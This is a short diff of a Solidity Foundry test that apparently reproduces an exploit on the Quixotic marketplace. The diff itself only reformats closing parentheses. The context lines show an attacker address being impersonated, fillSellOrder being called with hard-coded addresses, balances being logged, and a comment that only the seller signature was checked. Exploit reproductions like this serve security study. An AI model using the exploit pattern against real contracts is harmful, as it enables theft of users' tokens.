@@ -34,7 +34,7 @@ contract ContractTest is DSTest {
         cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);
         emit log_named_uint(
             "Before exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
-            );
+        );
         quixotic.fillSellOrder(
             0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,
             0xbe81eabDBD437CbA43E4c1c330C63022772C2520,
@@ -50,7 +50,7 @@ contract ContractTest is DSTest {
         );
         emit log_named_uint(
             "After exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
-            );
+        );
 
         //issues was only check seller signature
         //require(_validateSellerSignature(sellOrder, signature),
